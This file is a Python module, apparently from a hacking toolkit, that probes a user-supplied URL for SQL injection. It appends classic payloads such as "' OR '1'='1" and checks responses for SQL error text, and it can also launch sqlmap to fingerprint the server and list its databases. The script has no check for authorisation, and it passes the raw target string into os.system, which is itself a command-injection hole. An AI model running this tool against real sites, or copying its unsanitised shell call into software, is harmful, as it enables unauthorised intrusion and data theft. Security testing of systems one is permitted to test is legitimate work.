import os
import time
import requests
from urllib.parse import urlparse
from modules import utils

def run():
    utils.print_banner()
    utils.notify("SQL Injection Basic to Advanced", "red")

    target = input("\n\033[1;92m[?] Enter target URL with vulnerable param (e.g. https://example.com/index.php?id=1): \033[0m").strip()

    if not target.startswith("http"):
        utils.error("Invalid URL format. Must start with http or https.")
        return

    try:
        param_test = target + "'"
        r = requests.get(param_test, timeout=10)
        if "sql" in r.text.lower() or "syntax" in r.text.lower() or "mysql" in r.text.lower():
            utils.success("Potential SQL Injection vulnerability detected.")
        else:
            utils.warn("No obvious SQL error, continuing with tests anyway.")
    except Exception as e:
        utils.error(f"Error accessing target: {str(e)}")
        return

    choice = input("\n\033[1;93m[!] Do you want to auto-run sqlmap? (y/n): \033[0m")
    if choice.lower() == "y":
        sqlmap_path = utils.check_tool("sqlmap")
        if not sqlmap_path:
            utils.install_tool("sqlmap")

        os.system(f"sqlmap -u \"{target}\" --batch --banner --dbs --threads=4")
    else:
        utils.notify("Manual Test Selected", "blue")
        payloads = ["'", "' OR '1'='1", "'--", "' OR '1'='1' -- "]
        for p in payloads:
            test_url = target + p
            try:
                r = requests.get(test_url, timeout=8)
                if "sql" in r.text.lower() or "mysql" in r.text.lower():
                    print(f"\033[1;92m[+] Possible SQLi with payload: {p}\033[0m")
                else:
                    print(f"\033[1;91m[-] No response for: {p}\033[0m")
            except:
                pass

    print("\n\033[1;94m[!] SQL Injection test complete.\033[0m\n")
